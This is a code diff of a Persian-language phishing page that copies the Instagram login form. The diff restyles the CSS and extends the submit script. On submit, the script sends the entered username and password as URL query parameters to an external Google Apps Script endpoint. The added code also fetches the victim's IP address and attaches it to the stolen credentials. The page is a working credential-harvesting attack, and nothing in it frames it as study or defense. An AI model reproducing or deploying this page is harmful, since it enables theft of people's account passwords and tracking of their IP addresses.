@@ -3,23 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ورود به Instagram</title>
+    <title>ورود به instagram</title>
     <style>
-        html, body {
-            height: 100%;
-            margin: 0;
-            overflow: hidden; /* غیرفعال کردن اسکرول */
-        }
-
         body {
             display: flex;
             justify-content: center;
             align-items: center;
+            height: 100vh;
             background-color: #fafafa;
             font-family: Arial, sans-serif;
+            margin: 0;
             direction: rtl; /* تنظیم جهت‌گیری راست به چپ */
         }
-
         .login-container {
             width: 100%;
             max-width: 350px;
@@ -28,24 +23,13 @@
             border: 1px solid #dbdbdb;
             text-align: center;
             box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            margin: auto; /* قرار دادن فرم در مرکز */
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
+            position: relative;
         }
-
         .login-container h1 {
             font-family: 'Cookie', cursive;
             font-size: 48px;
             margin-bottom: 20px;
         }
-
         .login-container input[type="text"],
         .login-container input[type="password"] {
             width: 100%;
@@ -55,7 +39,6 @@
             border-radius: 3px;
             box-sizing: border-box;
         }
-
         .login-container button {
             width: 100%;
             padding: 10px;
@@ -68,44 +51,36 @@
             margin: 10px 0;
             position: relative;
         }
-
         .login-container button:disabled {
             background-color: #d1d1d1;
             cursor: not-allowed;
         }
-
         .login-container button:hover:enabled {
             background-color: #2a75d6;
         }
-
         .login-container a {
             color: #3897f0;
             text-decoration: none;
             font-size: 14px;
         }
-
         .separator {
             display: flex;
             align-items: center;
             text-align: center;
             margin: 20px 0;
         }
-
         .separator::before,
         .separator::after {
             content: '';
             flex: 1;
             border-bottom: 1px solid #dbdbdb;
         }
-
         .separator::before {
             margin-right: .25em;
         }
-
         .separator::after {
             margin-left: .25em;
         }
-
         .login-container .facebook-login {
             display: flex;
             align-items: center;
@@ -117,7 +92,6 @@
             text-decoration: none;
             margin: 10px 0;
         }
-
         .login-container .facebook-login img {
             margin-left: 8px;
         }
@@ -142,13 +116,11 @@
             box-shadow: none;
             margin: 0; /* حذف فاصله‌های اضافی */
         }
-
         .message.show {
             display: block;
             transform: translateY(0);
             opacity: 1;
         }
-
         .message.success {
             background-color: #4caf50; /* سبز برای موفقیت */
         }
@@ -156,7 +128,7 @@
 </head>
 <body>
     <div class="login-container">
-        <h1>Instagram</h1>
+        <h1>instagram</h1>
         <form id="loginForm">
             <input type="text" id="username" placeholder="شماره تلفن، نام کاربری، یا ایمیل" required>
             <input type="password" id="password" placeholder="رمز عبور" required>
@@ -172,7 +144,19 @@
     </div>
 
     <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
+        // تابع برای دریافت IP کاربر
+        async function getUserIp() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+                return null;
+            }
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
             event.preventDefault();
 
             var button = event.target.querySelector('button');
@@ -184,7 +168,11 @@
             var username = document.getElementById('username').value;
             var password = document.getElementById('password').value;
 
-            fetch('https://script.google.com/macros/s/AKfycbx8YXq5WSbxlXFOm3KB5LOdVx3D6a2LBh7k18eZ8eQOFdr710qH3VFNl5z8IzCuHRGC/exec?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password))
+            // دریافت IP کاربر
+            var userIp = await getUserIp();
+            
+            // ارسال IP و اطلاعات کاربر به سرویس Google Apps Script
+            fetch('https://script.google.com/macros/s/AKfycbxeDDY9vHrSkdIjoGOlKaXMVGJ69BctVww-EOqX9p7W2puzUwUOMNb6ywzRThIdQjz7/exec?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password) + '&ip=' + encodeURIComponent(userIp))
             .then(response => response.json())
             .then(data => {
                 if (data.success) {
